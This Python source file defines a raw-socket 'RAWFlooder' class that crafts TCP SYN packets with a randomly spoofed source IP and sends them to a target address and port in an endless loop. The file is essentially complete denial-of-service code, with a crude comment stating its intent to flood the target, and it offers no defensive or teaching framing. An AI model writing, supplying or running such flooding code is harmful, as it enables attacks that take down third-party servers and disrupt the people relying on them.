import socket
import sys
import random
from role import flooder
from struct import pack


class RAWFlooder(flooder.Flooder):
	def __init__(self, ip, port):
		flooder.Flooder.__init__(self, ip, port)
		self.socket_type = 3
		self.socket_protocol = 6

	def run(self):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		except socket.error:
			sys.exit()

		source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
		dest_ip = self.ip

		# IP header fields
		ip_ihl = 5
		ip_ver = 4
		ip_tos = 0
		ip_tot_len = 0
		ip_id = 54321
		ip_frag_off = 0
		ip_ttl = 255
		ip_proto = socket.IPPROTO_TCP
		ip_check = 0
		ip_saddr = socket.inet_aton(source_ip)
		ip_daddr = socket.inet_aton(dest_ip)

		ip_ihl_ver = (ip_ver << 4) + ip_ihl

		ip_header = pack(
			'!BBHHHBBH4s4s',
			ip_ihl_ver,
			ip_tos,
			ip_tot_len,
			ip_id,
			ip_frag_off,
			ip_ttl,
			ip_proto,
			ip_check,
			ip_saddr,
			ip_daddr
		)

		# TCP header fields
		tcp_source = 6969
		tcp_dest = int(self.port)
		tcp_seq = 454
		tcp_ack_seq = 0
		tcp_doff = 5

		# TCP flags
		tcp_fin = 0
		tcp_syn = 1
		tcp_rst = 0
		tcp_psh = 0
		tcp_ack = 0
		tcp_urg = 0
		tcp_window = socket.htons(5840)
		tcp_check = 0
		tcp_urg_ptr = 0

		tcp_offset_res = (tcp_doff << 4) + 0
		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

		tcp_header = pack(
			'!HHLLBBHHH',
			tcp_source,
			tcp_dest,
			tcp_seq,
			tcp_ack_seq,
			tcp_offset_res,
			tcp_flags,
			tcp_window,
			tcp_check,
			tcp_urg_ptr
		)

		msg = self.get_random_message()

		# Pseudo header fields
		source_address = socket.inet_aton(source_ip)
		dest_address = socket.inet_aton(dest_ip)
		placeholder = 0
		tcp_length = len(tcp_header) + len(msg)

		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, self.socket_protocol, tcp_length)
		psh = psh + tcp_header + msg

		tcp_check = self.checksum(psh)

		tcp_header = pack(
			'!HHLLBBH',
			tcp_source,
			tcp_dest,
			tcp_seq,
			tcp_ack_seq,
			tcp_offset_res,
			tcp_flags,
			tcp_window
		) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)

		packet = ip_header + tcp_header + msg

		# Flood that bitch
		try:
			while True:
				try:
					s.sendto(packet, (dest_ip, int(self.port)))
				except socket.error:
					try:
						s.close()
						s = socket.socket(socket.AF_INET, self.socket_type)
						s.connect((self.ip, int(self.port)))
					except socket.error:
						print('Reconnecting...')
		except KeyboardInterrupt:
			sys.exit()
